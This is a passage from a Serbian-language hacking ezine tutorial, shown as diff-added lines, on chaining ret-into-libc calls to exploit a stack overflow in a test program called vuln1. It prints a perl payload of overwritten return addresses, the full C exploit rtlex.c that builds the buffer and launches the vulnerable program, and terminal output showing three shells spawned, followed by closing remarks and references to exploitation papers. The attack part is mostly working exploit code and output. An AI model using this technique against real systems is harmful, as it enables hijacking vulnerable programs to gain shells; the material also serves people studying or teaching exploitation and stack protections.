+vraca na RET koja je u ovom slucaju djubre od 4 A bajta (vi stavite adresu 
+exit() da bi program lepo zavrsio sa radim, kod mene adresa exit() sadrzi NULL
+pa nemogu) i program se zavrsava signalom SIGSEGV (signal segment violation) ili
+ti segmentation fault. Da vidimo kako to izgleda:
+Prvo da izracunamo adrese. EBP-16 = 184 odnosno b8 u hex zapisu.
+I idemo:
+
+bash-2.05b$ ./vuln1 `perl -e 'print "A"x24 . "\xb8\xf6\xff\xbf\xa0\xb4\x06\x40\x
+b0\x83\x04\x08\x4b\xfd\xff\xbf\xc8\xf6\xff\xbf\xa0\xb4\x06\x40\xb0\x83\x04\x08\x
+4b\xfd\xff\xbf\xb8\xf6\xff\xbf\xa0\xb4\x06\x40AAAA\x4b\xfd\xff\xbf"'`
+sh-2.05b$ exit
+exit
+sh-2.05b$ exit
+exit
+sh-2.05b$ exit
+exit
+Segmentation fault
+bash-2.05b$
+
+Posto smo vezali tri system() poziva sa argumetom /bin/sh dobili smo tri
+puta pokrenut shell. Nije bas korisno, ali malo sam u zurbi tako da na vama 
+ostavljam kreativnost. S opisanim stvarima, nebi trebalo da vam predstavlaj 
+problem vezivanje bilo kojih poziva zarad dobijanja bilo cega.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 7. Exploit program
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Sve je to lepo, ali nekako nije elegantno bez pravog programa koji 
+exploituje zar ne? Naravno da je isto, ali ajde i to da uradimo:)
+
+   Znaci treba nam program koji ce da exploituje nas ranjiv program.
+Posto vec znamo gde je ranjivost ii kako da je eksploatisemo ostaje nam samo 
+da napisemo program koji ce da pravi taj bafer koji exploituje program.
+Dakle vrlo prosta stvar zar ne.
+
+________<rtlex.c>___________________
+main()
+{
+      char buf[256];
+      long system_addr = 0x4006b4a0;    //adresa system()
+      long leaveret    = 0x080483b0;    //adresa leaveret nadjena preko gdb
+      long argv   = 0xbffffd4b;        //adresa argv nadjena pomocu envad
+      long ebp    = 0xbffff6c8-16;     // adresa ebp-a nadjena preko gdb
+
+
+strcpy(buf,"AAAAAAAAAAAAAAAAAAAAAAAA"); //popunjavanje bafera , 24 A karaktera
+*(long*)&buf[24] = ebp;             //dodavanje adrese ebp u bafer iza 24 A
+*(long*)&buf[28] = system_addr;     //dodavanje system() adrese
+*(long*)&buf[32] = leaveret;        //dodavanje leaveret adrese
+*(long*)&buf[36] = argv;            //dodavanje argv adrese
+*(long*)&buf[40] = ebp+16;          //dodavanje ebp+16 adrese
+*(long*)&buf[44] = system_addr;     //dodavanje system() adrese
+*(long*)&buf[48] = leaveret;        //dodavanje leaveret adrese
+*(long*)&buf[52] = argv;            //dodavanje argv adrese
+*(long*)&buf[56] = ebp;             //dodavanje adrese ebp
+*(long*)&buf[60] = system_addr;    /*dodavanje system() adrese umesto 
+                                    exit() zbog vec opisanih razloga*/
+*(long*)&buf[64] = system_addr;     //dodavanje system() adrese
+*(long*)&buf[68] = argv;            //dodavanje argv adrese
+buf[72]='\0';                       // zavrsavanje bafera NULL bajtom 
+
+execl("./vuln1" , "vuln1" , buf , 0); /* izvrsavanje ranjivog programa sa 
+                                      buf baferaom kao parametrom */
+}
+________</rtlex.c>__________________
+
+
+Nadam se da dodatna objasnjenja nisu potrebna jer se iz komentara koda vidi 
+sta se desava. Program prvo pravi bafer koji nama treba, a zatim pokrece 
+ranjiv  program koristeci bafer kao parametar pri izvrsavanju.
+I da vidimo radi li ovo:
+
+bash-2.05b$ gcc rtlex.c -o rtlex
+bash-2.05b$ ./rtlex
+sh-2.05b$ exit
+exit
+sh-2.05b$ exit
+exit
+sh-2.05b$ exit
+exit
+Segmentation fault
+bash-2.05b$
+
+Za divno cudo, radi:) I prilicno je elegantnije nego onako zar ne.
+Nemorate da racunate adrese, nemorate da se mucite s perl-om...Jedini problem
+je sto morate da rucno nadjete adrese pre kompajliranja exploita, izmenite ih 
+i zatim ga kompajlirate.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 8. Odvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Pa sta da kazem, kao i uvek do sada, nadam se da je ovo nekome koristilo.
+Ako imam neku gresku u tekstu(nevezanu za gramatiku vec za teoriju ili 
+opisane tehnike) slobodno mi pisite na mail wintermuth@headcoders.net. Takodje 
+ako nalazite da nesto nisam dovoljno dobro objasnio ili vam jednostavno nije 
+jasno, rado cu odgovoriti na mailove. Odavde nastavite na izucavanje pisanja
+exploita koji rade "in the wild" iliti nisu zavisni od adresa koje vi treba 
+da nadjete sami vec sve rade automatski. Preciznost je jako jako vazna u 
+ovom poslu i poznavanje tih tehnika ce vam olaksati zivot u buducnosti. 
+Dalje interesovanje za eksploadtaciju sistema za zasticenim stackom mozete 
+zadovoljiti proucavanjem grsecurity PaX  i Solar Designer-ova Openwall 
+resenja.Pozdrav svim jahacima mreze tamo koji razumeju sustinu hackinga i
+intereseuju se za to na pravi nacin, umecete da se prepoznate i nadam se 
+da ce vas biti sve vise. Da bi podigli svest o vaznosti sigurnosti racunara 
+na nasim prostorima.Veliki pozdrav celoj BlackHatz ekipi i poseban pozdrav 
+onima koji rade na odrzanju phearless eZine-a.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 9. Reference
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Ovo su otprilike tekstovi i knjige koje su mi pomogle dosta. Nebi bilo 
+lose da procitate nergal-ov clanak za phrack o ret into libc exploitima, on to 
+malo naprednije opisuje, ali ima neizmerno korisnih stvari. Takodje, ako ste u 
+mogucnosti, nabavite knjigu Shellcoder`s Handbook, veoma veliki izvor znanja 
+iz velikog broja oblasti vezanih za tematiku exploatacije programa.
+
+
+   [1] Smashing The Stack For Fun And Profite
+            Aleph1  http://www.phrack.org/show.php?p=49&a=14
+   [2] Advanced Ret-into-lib(c) exploits
+            nergal  www.phrack.org/phrack/58/p58-0x04
+   [3] Hacking: The Art Of Exploitation
+            Jon Erickson
+   [4] Shellcoder`s Handbook
+            Jack Koziol, Dave Aitel , David Litchfield...
+   [5] Getting around non-executable stack (and fix)
+            Solar Designer  http://www.ouah.org/solarretlibc.html
+   [6] Defeating Solar Designer's Non-executable Stack Patch
+            www.insecure.org/sploits/non-executable.stack.problems.html
+   [7] Defeating Solaris/SPARC Non-Executable Stack Protection
+            thc.org/root/docs/exploit_writing/sol-ne-stack.html
